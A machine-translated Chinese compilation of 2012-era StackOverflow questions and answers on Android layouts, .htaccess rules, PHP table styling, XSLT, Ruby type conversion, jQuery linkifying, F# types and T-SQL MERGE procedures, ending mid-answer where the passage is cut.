# StackOverflow 问答 12318000-12318999

# android-layout - 相对布局 id 没有在 android 的平板电脑上出现

> ID：12318002
> 
> 赞同：0
> 
> 时间：2012-09-07T12:21:38.047
> 
> 标签：android-layout

我正在为 7" 平板电脑（600*1024）和 10" 平板电脑（720*1280）制作应用程序。我为布局和可绘制创建了以下文件夹。

```
drawable-hdpi
drawable-land-hdpi
drawable-land-mdpi
drawable-large-mdpi
drawable-large-port-mdpi
drawable-ldpi
drwable-mdpi

layout
layout-sw600dp(7")
layout-sw720dp(10")
layout-land
layout-sw600dp-land(7")
layout-sw720dp-land(10") 
```

它在移动设备上运行良好，但在平板电脑上不工作。它在应用程序的第一个屏幕上为相对布局提供空指针异常。在使用平板电脑时它没有从 XML 中选择相对布局。我正在模拟器上进行测试。任何人都可以帮助我.

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-04T07:51:14.403

我也面临同样的问题。`RelativeLayout`当我在平板电脑上测试时，id 为空。

**问题是：**错误地我没有`RelativeLayout`在`xml`与平板电脑相对应的布局中添加，这意味着大布局。

在您的情况下，这些 (layout-sw600dp(7")、layout-sw720dp(10")、layout-sw600dp-land(7")、layout-sw720dp-land(10")) 是与大屏幕相关的文件夹。

为了解决我在大型布局文件夹`RelativeLayout`中的相应文件中添加的问题。`xml`

当我再次测试它的平板电脑时，它停止了投掷`NPE`。`RelativeLayout`

# .htaccess - 非现有子域在 google 中被编入索引？

> ID：12318003
> 
> 赞同：0
> 
> 时间：2012-09-07T12:21:44.380
> 
> 标签：.htaccess, subdomain

在我的网站上`example.com`，没有这样的域`www2.example.com`，`ww4.example.com`但谷歌搜索显示了这样的页面。

显然该网站确实有这样的页面（重复`example.com`）那么如何阻止呢？似乎是一些`http`访问问题

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-07T13:39:28.863

您可以使用 htacces 为这些子域生成 403 或 404，这将使 google 从他的索引中删除它（可能需要一点时间）：

```
RewriteEngine on
RewriteCond %{HTTP_HOST} ^ww(w2|4)\.example\.com$
RewriteRule . - [F] # will generate 403 forbidden 
```

# php - 将 PHP 备用表格行颜色添加到现有 HTML 表格

> ID：12318004
> 
> 赞同：0
> 
> 时间：2012-09-07T12:21:45.877
> 
> 标签：php, html-table

我有一个已经用 PHP 编写的表，它回显从数据库调用的数据，如下所示：

```
<TABLE cellSpacing=1 cellPadding=2 align=center bgColor=#aaaaaa border=0 width="100%" class="logintbl">
             <TR>
              <TD bgColor=whitesmoke colSpan=0><B>Pages</B></td>
            </tr>
            <tr>
                <td>
                    <table align="center" cellSpacing=0 cellPadding=2 border="0" width="100%">
                        <tr>
                            <td align="center" valign="bottom">&nbsp;<font color="#4d71a1"><b>Page Name</b></font>&nbsp;</td>
                        </tr>
                        <?php while ($row = mssql_fetch_array($result)) { ?>
                        <tr bgcolor="#eeeeee">

                            <td align="center"><?php echo $row["PageURL"]; ?></td>
                            <td align="center">
                            <a href="PageUpdate.php?id=<?php echo $row["PageID"]; ?>"><img src="images/0013-pen.gif" width="16" height="16" alt="" border="0"></a>&nbsp;&nbsp;&nbsp;
                            </td>

                        </tr>
                <?php } ?>
                        <tr><td colspan="7">&nbsp;</td></tr>
                        <tr>
                            <td colspan="7" align="center">
                            </td>
                        </tr>

                    </table>
                </td>
            </tr>
        </table> 
```

我一直在尝试使用一段 PHP 代码来改变行的颜色，并且在一些研究实现了这一点之后：

```
<tr bgcolor="<?php echo ($clrCounter++ % 2 == 0 ? '#000000' : '#ffffff'); ?>"> 
```

它似乎无法正常工作，所以我觉得我在某个地方出错了，我知道我可以实现更长的方法来实现它。我只是希望有一些简单的东西。我是否在浪费精力尝试以这种方式实现它？

我将其集成如下：

```
 <TABLE cellSpacing=1 cellPadding=2 align=center bgColor=#aaaaaa border=0 width="100%" class="logintbl">
            <TR>
              <td bgColor=whitesmoke colSpan=0><B>Pages</B></td>
            </tr>
            <tr>
                <td>
                    <table align="center" cellSpacing=0 cellPadding=2 border="0" width="100%">
                        <tr bgcolor="#3A7525">
                            <td align="center" valign="bottom">&nbsp;<font color="#4d71a1"><b>Page Name</b></font>&nbsp;</td>
                        </tr>
                        <?php while ($row = mssql_fetch_array($result)) { ?>

                        <tr bgcolor="<?php echo ($clrCounter++ % 2 == 0 ? '#C2C2C2' : '#ffffff'); ?>">

                            <td align="center"><?php echo $row["PageURL"]; ?></td>
                            <td align="center">
                            <a href="PageUpdate.php?id=<?php echo $row["PageID"]; ?>"><img src="images/0013-pen.gif" width="16" height="16" alt="" border="0"></a>&nbsp;&nbsp;&nbsp;
                            </td>

                        </tr>
                <?php } ?>
                        <tr>
                            <td colspan="7" align="center">
                            </td>
                        </tr>

                    </table>
                </td>
            </tr>
        </table> 
```

它有点工作，但出于某种原因，第一个条目是蓝色的？当我指定白色和灰色时。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-07T12:28:03.110

使用 CSS 选择器`:nth-of-type( )`。

通过为两者设置不同的样式，`:nth-of-type(even)`浏览`:nth-of-type(odd)`器会为您执行交替样式，因此您不必担心它。

请参阅[W3Schools](http://www.w3schools.com/cssref/sel_nth-of-type.asp)条目。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-09-07T12:40:19.483

在循环从数据库返回的结果时，您可以使用以下内容：

```
<?php

// Define row colors
$color1 = "#FFFFFF";
$color2 = "#F4F9FF";

// Set row counter
$row_count = 0;

while ($row = mssql_fetch_array($result)) {
    $row_color = ($row_count % 2) ? $color1 : $color2;
?>
    <tr bgcolor="<?php echo $row_color; ?>">
        <td align="center"><?php echo $row["PageURL"]; ?></td>
        <td align="center">
            <a href="PageUpdate.php?id=<?php echo $row["PageID"]; ?>"><img src="images/0013-pen.gif" width="16" height="16" alt="" border="0"></a>&nbsp;&nbsp;&nbsp;
        </td>
    </tr>
<?php

    $row_count++;

}

?> 
```

或者，您可以替换 bgcolor 标记并为每一行分配一个 CSS 类。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-07T12:34:17.027

试试这个：

```
<tr <?php if($i%2){?>bgcolor="#eeeeee"<?php } else{ ?>bgcolor="red" <?php } $i++; ?>> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-04-03T13:46:03.277

感谢 Bas van den Heuvel 使用 CSS 提供的出色答案。如果您像我一样遇到额外的行间距，并且想要删除它，请使用以下示例代码。这将使交替的颜色线更紧密地结合在一起。（我用的是浅灰色和白色）

```
p:nth-of-type(odd)
{
background:#e2e2e2;
margin: 0px;
padding: 0px;
}
p:nth-of-type(even)
{
background:#ffffff;
margin: 0px;
padding: 0px;
} 
```

# xslt - XSLT：根据条件设置多个变量

> ID：12318006
> 
> 赞同：10
> 
> 时间：2012-09-07T12:21:53.713
> 
> 标签：xslt, xslt-1.0, exslt

我想根据一种条件环境分配多个变量。我只知道如何为一个变量做到这一点：

```
<xsl:variable name="foo">
    <xsl:choose>
        <xsl:when test="$someCondition">
            <xsl:value-of select="3"/>
        <xsl:when>
        <xsl:otherwise>
            <xsl:value-of select="4711"/>
        </xsl:otherwise>
    </xsl:choose>
</xsl:variable> 
```

但是如果我想根据相同的条件 $someCondition 分配两个变量怎么办？

我不想再次编写相同的 xsl:choose 语句，因为在实际示例中它有点冗长且计算量很大。

有问题的环境是带有 exslt 扩展的 libxslt (xslt 1.0)。

编辑：我想要的是类似于

```
if (condition) {
    foo = 1;
    bar = "Fred";
}
else if (...)  {
    foo = 12;
    bar = "ASDD";
}
(... more else ifs...)
else {
    foo = ...;
    bar = "...";
} 
```

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-09-07T12:37:52.687

你可以让你的主要变量返回一个元素列表；一个用于您要设置的每个变量

```
 <xsl:variable name="all">
     <xsl:choose>
        <xsl:when test="a = 1">
           <a>
              <xsl:value-of select="1"/>
           </a>
           <b>
              <xsl:value-of select="2"/>
           </b>
        </xsl:when>
        <xsl:otherwise>
           <a>
              <xsl:value-of select="3"/>
           </a>
           <b>
              <xsl:value-of select="4"/>
           </b>
        </xsl:otherwise>
     </xsl:choose>
  </xsl:variable> 
```

然后，使用 exslt 函数，您可以将其转换为“节点集”，然后可用于设置您的各个变量

```
 <xsl:variable name="a" select="exsl:node-set($all)/a"/>
  <xsl:variable name="b" select="exsl:node-set($all)/b"/> 
```

不要忘记，您需要在 XSLT 中为 exslt 函数声明名称空间才能使其工作。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-07T12:42:18.910

> 但是如果我想根据相同的条件 $someCondition 分配两个变量怎么办？
> 
> 我不想再次编写相同的 xsl:choose 语句，因为在实际示例中它有点冗长且计算量很大。

假设变量的值不是节点，这段代码不使用任何扩展函数来定义它们：

```
<xsl:variable name=vAllVars>   
     <xsl:choose> 
        <xsl:when test="$someCondition"> 
            <xsl:value-of select="1|Fred"/> 
        <xsl:when> 
        <xsl:when test="$someCondition2"> 
            <xsl:value-of select="12|ASDD"/> 
        <xsl:when> 
        <xsl:otherwise> 
            <xsl:value-of select="4711|PQR" />
        </xsl:otherwise> 
    </xsl:choose> 
</xsl:variable>   

<xsl:variable name="foo" select="substring-before($vAllVars, '|')"/>
<xsl:variable name="bar" select="substring-after($vAllVars, '|')"/> 
```

# c# - 在滚动条出现之前将窗口大小设置为最小大小 C#

> ID：12318010
> 
> 赞同：-3
> 
> 时间：2012-09-07T12:22:04.027
> 
> 标签：c#, winforms, size

基本上我试图在滚动条出现之前将窗口大小自动设置为最小大小，从逻辑上讲，我认为如果我将窗口大小设置为这个大小并且所有组件都应该显示没有问题，我尝试了几个在回答其他问题但不起作用的答案中，最小大小为 0。

当我启动我的应用程序时，它没有显示完整的内容，我在 radform 中使用 Telerik 报告查看器（如果有人知道它是什么），但不要介意名称，报告查看器和 radform 只是扩展已知的 winform 和组件，因此适用相同的规则。

问题是当我显示窗口时它不会显示完整的组件，它主要是我需要通过调整窗口大小来删除的水平滚动条。

我尝试在表单和组件上输出 autoscrollminize 属性，但它们都是 0,0 但是如果滚动条出现并在我手动调整窗口大小时消失，则应该有一个属性/值可以用来设置窗口大小开始。

**技术信息：** 如果我取消停靠 reportviewer 组件，该组件已经停靠，滚动条出现在该组件内，因此关键是根据该组件中的数据确定垂直滚动条何时出现

我已经尝试将窗口的 autosize 属性设置为 true 并将大小设置为 10,10 找到最小大小/AutoScrollMinSize 将大小设置为首选大小（当我这样做时，窗口采用绝对最小的可能大小，仅显示标题栏.)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-07T12:41:13.213

表格最小尺寸是您在表格上设置的最小尺寸，它不是为您计算的最小值。

您需要计算/找出控件所需的空间，然后您将在表单高度/宽度中设置一个值。为了计算控件所需的空间，这取决于您：行数乘以行高 + 页眉/页脚高度？或类似的东西。

你甚至可以做一些不同的研究：如果有滚动条，在某个地方已经有你需要的值，你只需要找出它。为了进行这种研究，有一个非常有用的小型免费工具

Hawkeye - .Net 运行时对象编辑器 - [http://hawkeye.codeplex.com/](http://hawkeye.codeplex.com/)

它像属性网格一样工作，但您可以将其连接到正在运行的 .net 程序，它会向您显示所有内容（属性值、私有字段值、对象引用...），因此您可以尝试挖掘滚动条对象以查看是否你可以找出你的高度/宽度值。

# java - 是玩！适合创建 REST API 的 Framework 2.0？

> ID：12318020
> 
> 赞同：10
> 
> 时间：2012-09-07T12:22:50.060
> 
> 标签：java, rest, playframework, playframework-2.0

我使用 Play 开发了一个 REST API！框架1.2.4，我非常喜欢这个框架。如果我走传统的 Java EE 路线，简单性和快速的开发周期帮助我在很短的时间内实现了这一目标。

现在我正在使用 Play 进行探索！2.0.3 用于我的下一个项目。我看到虽然框架得到了增强，并且使开发**web 应用程序变得更加容易，但对于****REST API**却不能这么说。我的应用程序不会有任何 HTML - 我只会使用 XML 或 JSON 或我决定将来使用的任何数据交换格式进行响应。

所以，问题是：

> **这里有没有人使用 Play 2.0.x 来公开非 html 纯 REST API？**

## 更多细节：

以下是我认为与 1.2.x 相比，在 Play 2.0.x 中开发纯 REST API 更加困难的一些因素。如果我错了，请纠正我的理解。

### 内容协商更难

在玩！1.2.4，我的内容协商被构建到框架中。有一些选项可以在路由文件中定义请求期望的内容类型。

`GET /friends User.listFriends(format:'xml')`

然后，在控制器中，

```
public static void getFriends(){
    render();
} 
```

这将导致`views/xml/User/listFriends.xml`模板自动呈现。明天要添加对 JSON 的支持，我需要做的就是添加一个`views/json/User/listFriends.json`模板。

我不明白如何在游戏中做到这一点！2.0.x

### 创建非 html 模板不太直观

经过反复试验，我发现可以在视图文件夹中创建一个 listFriends.scala.xml ！2.0。然后，需要在控制器代码中调用如下：

`return ok(views.xml.listFriends.render())`;

但是，Eclipse 不喜欢这样，因为 Eclipse 不知道它，`views.xml.listFriends`因为它是在 play 编译完成后生成的。我在这里有什么遗漏吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-07T13:35:08.180

正如 Pere Villega 所解释的，但使用 Java 语法：

```
String xml = getXMLAsString();
return ok(xml).as("text/xml"); 
```

[as() 方法](http://www.playframework.org/documentation/api/2.0.3/java/play/mvc/Results.Status.html#as%28java.lang.String%29)是[Status 类](http://www.playframework.org/documentation/api/2.0.3/java/index.html)的一部分。

或者，另一种选择是：

```
String xml = getXMLAsString();
response().setContentType("text/xml")
return ok(xml); 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-09-07T13:01:10.850

在 Play (Scala) 中，您可以执行以下操作：

```
val myXMl = obtainXML();
return Ok(myXML).as("text/xml") 
```

我不确定 Java 中的语法，但它是等效的：不是创建模板，而是生成 XML，然后将其发送给用户，将返回类型设置为“text/xml”（或 json 或无论你需要什么）。

# ruby - 如何仅将数字的字符串哈希值转换为整数

> ID：12318021
> 
> 赞同：3
> 
> 时间：2012-09-07T12:22:51.123
> 
> 标签：ruby, string, integer, type-conversion

我有从几个不同的 XML 数据库转储导入的哈希行，看起来像这样（但具有不同的键）：

```
{"Id"=>"1", "Name"=>"Cat", "Description"=>"Feline", "Count"=>"123"} 
```

我尝试使用`#to_i`，但它将非数字字符串转换为`0`：

```
"Feline".to_i
# => 0 
```

但我想要的是一种`"Feline"`保留字符串的方法，而`Id`在`Count`上面的例子中，和变成整数`1`和`123`.

有没有一种简单的方法可以*仅*将数字字符串值转换为整数？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-09-07T12:38:53.810

一条线答案：使用正则表达式方法

```
h.merge(h) { |k, v| v.match(/\A[+-]?\d+?(\.\d+)?\Z/) ? v.to_i : v } 
```

使用整数方法

```
h.merge(h) { |k, v| Integer(v) rescue v } 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-09-07T12:26:20.950

使用[内核#整数](http://www.ruby-doc.org/core-1.9.3/Kernel.html#method-i-Integer)：

```
my_hash = {"Id"=>"1", "Name"=>"Cat", "Description"=>"Feline", "Count"=>"123"}
Hash[ my_hash.map{ |a, b| [ a,
                            begin
                              Integer b
                            rescue ArgumentError
                              b
                            end ] } ] 
```

稍后添加：使用我的`y_support`gem，您可以使哈希操作更加简洁。

```
require 'y_support/core_ext/hash'
my_hash.with_values { |v| begin
                            Integer b
                          rescue ArgumentError
                            b
                          end } 
```

`YSupport`可以安装`gem install y_support`并且还提供`Hash#with_keys`, `Hash#with_values!`, `Hash#with_keys!`, 做你期望他们做的事情, 并且`Hash#modify`期望一个二进制块返回一对值, 修改适当的哈希值。已经有人提议在未来将此类方法直接添加到 Ruby 核心中。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-07T12:47:53.887

我想你知道哪些字段应该是整数（你的消费代码可能取决于它），所以我建议你转换特定的字段。

```
c = Hash[h.map { |k,v| [k, %w(Id Count).include?(k) ? Integer(v) : v ] }] 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2018-07-06T10:32:14.403

我有一个**类似**的问题要解决，其中农药分析的结果以异构（糟糕的设计！）格式进入系统......负整数作为特殊代码（未检测，未测试，未量化等......），`nil`如未检测到的同义词，用于量化化合物的浮点数和用于通过/失败*布尔值*的字符串...保持你的马，这是一个 10 年的生产运行，从未经过*绿地开发的*高度修补的应用程序；）

**我从顶级 rubists 那里学到了**两件事：****

 **`0) DON'T ITERATE-MODIFY AN ENUMERABLE (return a copy)`

`1) YOUR REGEX WON'T COVER ALL CASES`

虽然我不是 . 的忠实粉丝`rescue`，但我认为它符合保持代码清洁的目的。所以，我一直在使用它来减轻我的输入：

```
ha = { 
 "p_permethrin" => nil, 
 "p_acequinocyl"=>"0.124", 
 "p_captan"=>"2.12", 
 "p_cypermethrin"=>"-6", 
 "p_cyfluthrin"=>"-6",
 "p_fenhexamid"=>"-1", 
 "p_spinetoram"=>"-6", 
 "p_pentachloronitrobenzene"=>"-6", 
 "p_zpass"=>"true"
}

Hash[ha.map{|k,v| [k, (Float(v) rescue v)]}] # allows nil
Hash[ha.map{|k,v| [k, (Float(v) rescue v.to_s)]}] # nit to empty string 
```

我什至会

```
class Hash
  # return a copy of the hash, where values are evaluated as Integer and Float
  def evaluate_values
    Hash[self.map{|k,v| [k, (Float(v) rescue v)]}]
  end
end 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-07T12:29:46.593

使用正则表达式和三元运算符，您可以将其合并到某处的逻辑中：

```
string =~ /^\d+$/ ? string.to_i : string 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-09-07T12:43:06.493

这不仅会处理整数，还会处理所有数字。

```
my_hash = {"Id"=>"1", "Name"=>"Cat", "Description"=>"Feline", "Count"=>"123"}

result = my_hash.inject({}) { |result,(key,value)|
    if value.match(/^\s*[+-]?((\d+_?)*\d+(\.(\d+_?)*\d+)?|\.(\d+_?)*\d+)(\s*|([eE][+-]?(\d+_?)*\d+)\s*)$/)
            result[key.to_sym] = value.to_i
    else
            result[key.to_sym] = value
    end
    result
} 
```

感谢[确定字符串是否是正则](https://stackoverflow.com/questions/1034418/determine-if-a-string-is-a-valid-float-value)表达式的有效浮点值

* * *

## 回答 #7

> 赞同：-1
> 
> 时间：2013-04-18T12:48:48.387

为 String 定义一个新方法：**String#to_number**

```
class String
  def to_number
    Integer(self) rescue Float(self) rescue self
  end
end 
```

测试它：

```
"1".to_number => 1
"Cat".to_number => "Cat" 
```**

# javascript - 查找并转换所有以 http 和 https 开头的字符串并转换为链接

> ID：12318023
> 
> 赞同：1
> 
> 时间：2012-09-07T12:22:58.207
> 
> 标签：javascript, jquery, html

是否可以在段落中找到所有以 http 和 https 开头的字符串并使用 jquery 转换为链接？

我在我的网站上获得了我的 twitt 列表，所有行都以 http 和 https 开头，显示为普通字符串 [文本]。我想将它们转换为超链接。这可以用javascript，jQuery吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-07T12:33:17.393

这是检查字符串中的 URL 并将其转换为链接的代码。这也将检测以 WWW 开头的链接。希望这会有所帮助。

```
function Checkurl(text) {
        var url1 = /(^|&lt;|\s)(www\..+?\..+?)(\s|&gt;|$)/g,
        url2 = /(^|&lt;|\s)(((https?|ftp):\/\/|mailto:).+?)(\s|&gt;|$)/g;

        var html = $.trim(text);
        if (html) {
            html = html
                .replace(url1, '$1<a style="color:blue; text-decoration:underline;" target="_blank"  href="http://$2">$2</a>$3')
                .replace(url2, '$1<a style="color:blue; text-decoration:underline;" target="_blank"  href="$2">$2</a>$5');
        }
        return html;
    } 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-07T12:24:22.823

像这样的东西？

```
$(document).ready(function() {
   var linkable_content = $('div#linkable').html().replace(/(https?:\/\/[^ ;|\\*'"!,()<>]+\/?)/g,'<a href="$1">$1</a>');
    $('div#linkable').html(linkable_content);
}); 
```

来源：[http ://tangible.ca/articles/44/snippet-jquery-linkifier](http://tangible.ca/articles/44/snippet-jquery-linkifier)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-07T12:33:21.310

[jQuery WikiText 插件](http://www.kajabity.com/jquery-wikitext/usage.html)中的以下实用程序函数将起作用：

```
function findUrls( text )
{
    var source = (text || '').toString();
    var urlArray = [];
    var url;
    var matchArray;

    // Regular expression to find FTP, HTTP(S) and email URLs.
    var regexToken = /(((ftp|https?):\/\/)[\-\w@:%_\+.~#?,&\/\/=]+)|((mailto:)?[_.\w-]+@([\w][\w\-]+\.)+[a-zA-Z]{2,3})/g;

    // Iterate through any URLs in the text.
    while( (matchArray = regexToken.exec( source )) !== null )
    {
        var token = matchArray[0];
        urlArray.push( token );
    }

    return urlArray;
} 
```

[JSFiddle 这里](http://jsfiddle.net/zyXky/)。

我希望这有帮助！

# c# - 下载时将文件另存为 PDF

> ID：12318030
> 
> 赞同：0
> 
> 时间：2012-09-07T12:23:23.597
> 
> 标签：c#, .net

我有一个基于用户输入动态生成 RTF 文档的 Web 应用程序。生成后，用户可以下载文档。

我希望将文档下载为 PDF 文件而不是 RTF。

我怎样才能以编程方式做到这一点？

# javascript - 关闭当前打开的标签

> ID：12318041
> 
> 赞同：0
> 
> 时间：2012-09-07T12:24:14.833
> 
> 标签：javascript, jquery

我试图`window.close();`关闭当前打开的选项卡，但它似乎不起作用。我究竟做错了什么？我的范围是运行一个自动关闭手动打开的选项卡的 JavaScript 脚本。

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-07T14:08:56.913

通常在 javascript（或其他风格的 javascript）中，这是通过......

```
<a href="#" class="close">Close Window</a>

$(".close").click(function {
    window.close();
}); 
```

请注意，这仅适用于包含已单击链接的选项卡。它不会关闭浏览器中打开的其他选项卡。

对于这个问题的每条评论，我都会给 +1。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-07T14:18:17.900

你可以看看这个答案[how-to-close-current-tab-in-a-browser-window](https://stackoverflow.com/questions/2076299/how-to-close-current-tab-in-a-browser-window)

还请查看此答案的评论，其中[Ryan Joy](https://stackoverflow.com/users/247268/ryan-joy)说：

> “这个方法只允许被脚本使用 window.open 方法打开的窗口调用。” 换句话说，您只能使用 JavaScript 关闭通过 JavaScript 生成的窗口/选项卡”

另请注意：

```
window.close(); 
```

仅适用于 Internet Explorer，其中出现弹出消息询问用户是否同意关闭当前选项卡/窗口。

在 Firefox 中，Chrome 仅适用于通过上述“window.open()”方法打开的空选项卡和选项卡/窗口。

# c++ - 模板化显式转换运算符

> ID：12318046
> 
> 赞同：0
> 
> 时间：2012-09-07T12:24:23.963
> 
> 标签：c++, templates

所以，我有这个模板类，我正在尝试为其编写一个通用转换运算符。我想出的是这个（不起作用：“错误 - 'typename'之后需要一个限定名称”）：

```
template <typename T>
class object{
...
T internal;
...
template <typename U>
explicit operator typename decltype(
std::conditional< 
     std::is_convertible<T, U>::type , U, T>::type)()
{
return static_cast<std::conditional<std::is_convertible<T, U>::type ,U, T>::type>(internal);
} 
```

我做错了什么还是不可能？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-07T12:37:57.470

设法找到我自己的解决方案：

```
 template <typename U>
    explicit operator typename decltype(std::conditional< 
                                        std::is_convertible<T, U>::type , 
                                        U, 
                                        T>::type)::value_type ()

    {
        return static_cast<typename decltype(std::conditional< 
                        std::is_convertible<T, U>::type , 
                        U, 
                        T>::type)::value_type>(internal);
    } 
```

# .net - f# 中的循环类型引用

> ID：12318047
> 
> 赞同：5
> 
> 时间：2012-09-07T12:24:24.163
> 
> 标签：.net, generics, f#

我正在为 F# 中的 linq 表达式生成器编写简单的 excel 公式。我正在将公式解析为 AST 并使用递归表达式构建器构建表达式。我一直坚持将环境（（字符串，表达式）对的映射）传递给该调用中生成的表达式：

```
Expression.Lambda<System.Func<double>>(eval pexpr).Compile() 
```

其中 pexpr 被解析为 AST 而 eval 是表达式生成器函数。

问题在于定义应该如下所示的类型：

```
type ExprFunc = Func<ExprFunc map, double>
Expression.Lambda<ExprFunc>(eval pexpr).Compile() 
```

如果 pexpr 包含对 Var("name") 形式的其他表达式的引用，我想注入在环境映射中搜索具有“name”的函数的表达式并调用它，在该调用中传递相同的环境映射。

不幸的是，编译器说不：

此类型定义涉及通过缩写的直接循环引用

有没有办法在.net中定义这种函数类型？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-09-07T13:22:11.423

如果要编写引用自身的类型声明，则不能使用 F# 类型别名。问题是 F# 类型别名在编译时被删除，因此递归引用会导致无限类型：

```
Func<Func<Func<Func<... map, double> map, double> map, double> map, double> 
```

在 F# 中，最简单的选择可能是定义一个简单的可区分联合：

```
type ExprFunc = EF of Func<ExprFunc map, double> 
```

然后，您可以使用该模式`EF f`在 F# 函数中获取底层委托。不过，直接这样做是行不通的`Expression.Lambda`，所以你可能需要类似的东西：

```
type ExprFunc = Func<ExprFunc map, double> 
and WrappedExprFunc = EF of ExprFunc 
```

调用时`Expression.Lambda`，您需要使用`Func<..>`委托作为参数，但您需要修改代码`eval`以正确处理包装参数（类型为`WrappedExprFunc`）：

```
Expression.Lambda<ExprFunc>(eval pexpr).Compile() 
```

顺便说一句，如果您正在生成 C# 表达式树，则将其定义`WrappedExprFunc`为类可能更容易，因为这样更容易处理。这取决于您的其余代码。

# android - 在 android 4.0 中对外部 sd 卡的写权限

> ID：12318049
> 
> 赞同：0
> 
> 时间：2012-09-07T12:24:39.263
> 
> 标签：android, xml, permissions, android-sdcard

我在尝试将文件写入外部 SD 卡时遇到问题`android 4.0.3`，即使我已经使用了`WRITE_EXTERNAL_STORAGE`&之类的写权限`WRITE_MEDIA_STORAGE`，所以我找到了另一种方法来处理它，但现在我想知道我的应用程序是否是否可以写入可移动 SD 卡，如果没有，那么我想切换到内部 SD 卡。

所以现在的问题是我如何知道是否支持写入可移动 SD 卡，所以如果有人做过类似的实现，请随时在这里分享代码。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-07T12:33:46.973

直接从 API 指南回答：

[http://developer.android.com/guide/topics/data/data-storage.html#filesExternal](http://developer.android.com/guide/topics/data/data-storage.html#filesExternal)

```
 boolean mExternalStorageAvailable = false;
    boolean mExternalStorageWriteable = false;
    String state = Environment.getExternalStorageState();

    if (Environment.MEDIA_MOUNTED.equals(state)) {
        // We can read and write the media
        mExternalStorageAvailable = mExternalStorageWriteable = true;
    } else if (Environment.MEDIA_MOUNTED_READ_ONLY.equals(state)) {
        // We can only read the media
        mExternalStorageAvailable = true;
        mExternalStorageWriteable = false;
    } else {
        // Something else is wrong. It may be one of many other states, but all we need
        //  to know is we can neither read nor write
        mExternalStorageAvailable = mExternalStorageWriteable = false;
    } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-07T12:54:06.573

我有一个可以同时写入内部和外部 SD 卡的应用程序。我有 WRITE_EXTERNAL_STORAGE 权限，但没有别的。

处理外部SD卡的主要问题是找到路径，因为`getExternalStorageDirectory()`通常返回内部的。`/mnt`如果有帮助，它应该是 的子目录。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-07T12:37:07.647

要查找是否可以写入 SD 卡，请查看该`Environment`课程。

```
String externalStorageState = Environment.getExternalStorageState(); 
```

然后您可以使用检查此状态

`Environment.MEDIA_MOUNTED(externalStorageState)`和/或`Environment.MEDIA_MOUNTED_READ_ONLY`（外部存储状态）

# c# - 合并表（添加、更新和删除来自不同来源的记录）

> ID：12318050
> 
> 赞同：0
> 
> 时间：2012-09-07T12:24:38.983
> 
> 标签：c#, tsql, stored-procedures, datatable

我有三个表 tb1、tb2 和 tbTotal。它们具有相同的模式。这些表有三列，MetricID、Descr 和 EntryDE。

我想要的是将 tb1 与 tbTotal 合并。我已经这样做了，而且效果很好。我的存储过程是：

```
CREATE PROCEDURE [dbo].[Admin_Fill] 
-- Add the parameters for the stored procedure here
@MetricId INT,
@Descr VARCHAR(100),
@EntryDE VARCHAR(20)
 AS

 BEGIN
-- SET NOCOUNT ON added to prevent extra result sets from
-- interfering with SELECT statements.
SET NOCOUNT ON;
--SET IDENTITY_INSERT dbo.tbTotal ON
-- Insert statements for procedure here
;WITH cte AS (SELECT MetricId=@MetricId,Descr=@Descr,EntryDE=@EntryDE)
 MERGE tbTotal d
 USING cte s
 ON s.EntryDE = d.EntryDE
 AND s.MetricId=d.MetricId
 WHEN matched THEN UPDATE
 set MetricId=s.MetricId,
     Descr=s.Descr,
     EntryDE=s.EntryDE
 WHEN not matched BY TARGET THEN
 INSERT(MetricId,Descr,EntryDE)
 VALUES (s.MetricId,s.Descr,s.EntryDE);
 END 
```

我的 C# 代码：

```
 foreach (DataRow row in dt.Rows) // pass datatable dt1
        {
            MetricId = Convert.ToInt32(row["MetricId"]);
            Descr = row["Descr"].ToString();
            EntryDE = row["EntryDE"].ToString();
            parameters.Add("@MetricId", MetricId);
            parameters.Add("@Descr", Descr);
            parameters.Add("@EntryDE", EntryDE);
            dbaccess.ExecuteNonQuery(strStoredProcedure, parameters); //cmd.ExecuteNonQuery(); 
            parameters.Clear();
        } 
```

我还想从 dtTotal 中删除 dt2 中的所有记录。我不确定如何修改存储过程。

感谢帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-07T15:54:14.150

如果我已经理解您要正确执行的操作，那么这可能就是我希望实施解决方案的方式。

我会将 2 个数据表作为 TABLE 变量传递给 SP - 类似于下面，然后根据需要使用 SET 操作将 JOIN 用于 UPDATE 和 DELETE - 从而影响一个查询中的多行并避免分别循环遍历每一行。

正如 AdaTheDev[在相关答案中](https://stackoverflow.com/questions/12320594/passing-datatable-to-a-stored-procedure/12320758)所提到的，您最终将创建一个“TABLE”类型，但是拥有一个额外的类型并没有缺点，并且该解决方案的扩展性比循环方法要好得多。

免责声明：- 下面的代码在语法上可能不正确，但我希望你能明白我的提议。

```
CREATE TYPE TableType AS TABLE
(
 MetricId INT, 
 Descr VARCHAR(300) --or whatever length is appropriate, 
 EntryDE INT
);
GO

CREATE PROCEDURE [dbo].[Admin_Fill] 
